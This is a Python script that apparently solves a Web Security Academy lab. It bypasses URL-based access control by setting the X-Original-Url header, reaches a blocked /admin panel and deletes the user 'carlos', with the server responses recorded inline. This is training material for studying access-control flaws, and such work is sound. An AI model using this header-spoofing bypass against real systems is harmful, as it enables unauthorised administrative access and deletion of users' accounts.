# Lab: URL-based access control can be circumvented

import requests

base = "https://0a8f00ca041b89c58026d5da009900f0.web-security-academy.net"
tmp_session = requests.Session()

print("===========[step1] try access /admin===============")
page_admin = tmp_session.get(f"{base}/admin")
page_admin_status=page_admin.status_code
page_admin_result=page_admin.text
print(page_admin_status)
print(page_admin_result)
'''
403
"Access denied"
'''

print("===========[step2] recon X-Original-Url===============")
page_invalid = tmp_session.get(f"{base}/", headers={"X-Original-Url": "/invalid"})
page_invalid_status=page_invalid.status_code
page_invalid_result=page_invalid.text
print(page_invalid_status)
print(page_invalid_result)

'''
404
"Not Found"
'''

print("===========[step3] manipulate X-Original-Url===============")
page_manipulate_header = tmp_session.get(f"{base}/", headers={"X-Original-Url": "/admin"})
page_delete_carlos_status=page_manipulate_header.status_code
page_manipulate_header_result=page_manipulate_header.text
print(page_delete_carlos_status)
print(page_manipulate_header_result)
'''
                        <div>
                            <span>wiener - </span>
                            <a href="/admin/delete?username=wiener">Delete</a>
                        </div>
                        <div>
                            <span>carlos - </span>
                            <a href="/admin/delete?username=carlos">Delete</a>
                        </div>
'''

print("===========[FINAL] Delete Carlos Account===============")
page_delete_carlos = tmp_session.get(f"{base}/?username=carlos", headers={"X-Original-Url": "/admin/delete"}, allow_redirects=False)
page_delete_carlos_status=page_delete_carlos.status_code
page_delete_carlos_result=page_delete_carlos.text
print(page_delete_carlos_status)
print(page_delete_carlos_result)